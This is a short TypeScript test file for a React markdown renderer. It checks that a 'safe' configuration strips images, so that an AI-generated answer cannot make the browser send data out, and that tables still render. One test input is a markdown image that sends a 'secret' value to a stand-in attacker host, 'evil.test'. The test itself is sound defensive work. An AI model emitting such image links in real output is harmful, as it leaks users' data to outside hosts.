import { createElement } from "react";
import ReactMarkdown from "react-markdown";
import { renderToStaticMarkup } from "react-dom/server";
import { expect, it } from "vitest";
import { SAFE_MARKDOWN } from "@/lib/view/markdown";

const html = (text: string) => renderToStaticMarkup(createElement(ReactMarkdown, SAFE_MARKDOWN, text));

it("never renders images, so an answer cannot make the browser call out", () => {
  const out = html("hi ![x](https://evil.test/?d=secret) there");
  expect(out).not.toContain("<img");
  expect(out).not.toContain("evil.test");
});

it("still renders tables", () => {
  expect(html("| a | b |\n|---|---|\n| 1 | 2 |")).toContain("<table");
});
